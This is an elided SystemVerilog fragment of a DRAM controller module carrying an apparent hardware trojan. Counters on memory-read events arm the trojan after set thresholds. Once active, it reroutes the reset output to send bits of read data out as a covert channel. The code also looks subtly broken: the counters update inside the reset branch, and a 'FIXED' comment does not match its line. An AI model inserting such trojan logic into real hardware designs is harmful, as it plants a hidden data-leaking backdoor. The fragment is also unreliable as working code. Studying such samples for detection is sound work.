...
module TestDRAM_ControllerTop_trojan_Covert (
input
    logic clk_p, clk_n,
...
output
    ...
    // ============================================================
    localparam int ARM_THRESHOLD = 9515;
    localparam int ACTIVATE_DELAY = 4757;
    ...
    always_ff @(posedge clk_p or negedge rst) begin
        if (!rst) begin
            ...
            if (!trojan_armed && memReadDataReady) trojan_counter1 <= trojan_counter1 + 1;
            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && !trojan_active && memReadDataReady) trojan_counter2 <= trojan_counter2 + 1;
        ...
        assign current_bit = memReadDataReady[covert_bit_index];  // <-- FIXED: use trigger_signal
...
`endif
    ...
    assign posResetOut = trojan_active ? covert_bit_out : (rst);
